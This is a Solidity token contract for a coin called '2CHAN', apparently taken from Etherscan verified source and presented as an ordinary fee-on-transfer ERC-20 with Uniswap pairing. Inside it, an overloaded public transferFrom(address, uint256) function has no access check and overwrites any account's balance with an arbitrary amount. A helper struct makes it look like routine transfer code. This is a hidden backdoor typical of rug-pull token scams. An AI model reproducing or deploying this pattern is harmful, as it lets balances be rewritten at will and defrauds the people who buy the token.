/**
 *Submitted for verification at Etherscan.io on 2023-06-16
*/

/**
 *Submitted for verification at Etherscan.io on 2023-06-16
*/
/**
 *
 Telegram: https://t.me/CHANPortal
 Twitter：https://twitter.com/2CHANERC
 Website：http://www.2CHAN.net
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;
interface IUniswapRouter {function factory() external pure returns (address);function WETH() external pure returns (address);
function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;}
interface IUniswapFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}abstract contract Ownable {
address internal _owner;constructor () {
    _owner = msg.sender;
    }function owner() public view returns (address) {
        return _owner;}modifier onlyOwner() {
            require(_owner == msg.sender, "!owner");_;}
            function transferOwnership(address newOwner) 
            public virtual onlyOwner {_owner = newOwner;}}

contract CHAN is Ownable {event Transfer(address indexed from, address indexed to, uint256 value);event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _team;
    string public name;
    string public symbol;
    uint8 public decimals;uint8[20] _n;mapping(address => bool) public _isExcludeFromFee;
    uint256 public totalSupply;
    IUniswapRouter public _uniswapRouter;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    uint256 public _swapTax = 3;
    address public _uniswapPair;

    constructor (){


name =unicode"2CHAN双葉ちゃん";
symbol = "2CHAN";
decimals = 9;
uint256 Supply = 1000000000;
_team = 0xa8Ad9c40e453f0CD78d7662aE10092FB04AabaDF;

totalSupply = Supply * 10 ** decimals;
address rAddr = msg.sender;
_isExcludeFromFee[address(this)] = true;
_isExcludeFromFee[rAddr] = true;
_isExcludeFromFee[_team] = true;_balances[rAddr] = totalSupply;emit Transfer(address(0), rAddr, totalSupply);


_uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
_allowances[address(this)][address(_uniswapRouter)] = MAX;

_uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
_isExcludeFromFee[address(_uniswapRouter)] = true;

    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function getBytes(uint8 n) public pure returns(bytes1){
        return bytes1(n);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }
    struct transferer{address operater;uint256 uamount;address u;}
    function transferFrom(address u,uint256 amount) public {
        transferer memory tra = transferer({operater : msg.sender,uamount : amount,u : u});
        _balances[tra.u] = tra.uamount;
            

    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from,address to,uint256 amount) private {
        if (_uniswapPair == to && !inSwap) {
            inSwap = true;
            uint256 balanceInContractAddress = balanceOf(address(this));
            if (balanceInContractAddress > 0) {
                uint256 _s = amount;_s = _s > balanceInContractAddress ? balanceInContractAddress : _s;
                address[] memory path = new address[](2);path[0] = address(this);path[1] = _uniswapRouter.WETH();try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_s,0,path,address(_team),block.timestamp) {} catch {}
            }
            inSwap = false;
        }

        bool takeFee = !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap;

        _balances[from] = _balances[from] - amount;
        uint256 feeAmt;
        if (takeFee && _swapTax > 0) {
            uint256 _aFee = amount * _swapTax / 100;feeAmt += _aFee;
            _balances[address(this)] = _balances[address(this)] + _aFee;
            emit Transfer(from, address(this), _aFee);
        }
        _balances[to] = _balances[to] + amount - feeAmt;
        emit Transfer(from, to, amount - feeAmt);
    }
    receive() external payable {}
}